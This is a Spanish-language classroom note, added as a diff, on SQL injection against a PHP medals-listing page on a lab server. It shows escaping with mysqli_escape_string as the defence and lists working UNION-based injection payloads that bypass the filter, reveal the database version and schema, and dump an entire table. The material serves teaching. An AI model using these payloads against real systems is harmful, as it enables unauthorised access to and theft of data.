@@ -1,0 +1,26 @@
+Se supone que queremos hacer una injección SQL.
+Mirando el ejercicio 33_AJAX/07_medallas.php vemos que se obtiene un listado haciendo http://10.22.23.71/~juanjo/00_segundo/33_AJAX/medallas_modalidad.php?codigo=ar2
+Tenemos un listado que depende de un parámetro y esperamos poder usarlo para atacar.
+Se ha creado en el servidor un usuario atacar para atacarle a él.
+
+En el archivo medallas_modalidad.php se llama a la función medallas_modalidad(). Podríamos chequear que sea alfanumérico antes de llamar pero es más razonable proteger los parámetros en la query como 
+
+    $mod=mysqli_escape_string($conexion,$mod);
+	
+Depende de la conexión porque los caracteres a escapar dependen del charset
+	   
+CUIDADO. Si saneamos la query entera, nos la cargamos.
+
+	$sql=mysqli_escape_string($conexion,$sql);	
+
+Ejemplos de cosas a poner en el caqmpo de texto:
+
+[ar2]->Normal
+[ar2' OR 1=1 -- ] -> Listar sin filtro
+[ar2' UNION SELECT @@VERSION ,1,1 -- ] -> Descubrir el SGBD
+[ar2' UNION SELECT DATABASE(),1,1 FROM DUAL -- ]->Descubrir BBDD activa
+[ar2' UNION SELECT table_name COLLATE utf8_spanish_ci,1,1 FROM information_schema.tables WHERE table_schema='atacar'
+ -- ] -> Descubrir las tablas dela BBDD
+[ar2' UNION SELECT `COLUMN_NAME` COLLATE utf8_spanish_ci ,1,1 FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='atacar' AND `TABLE_NAME`='deportes' -- ] -> Descubrir nombres de campo
+ 
+[ar2' UNION SELECT `codigo`, `nombre`, `nombre` FROM `deportes`  -- ] -> listar una tabla ENTERA	
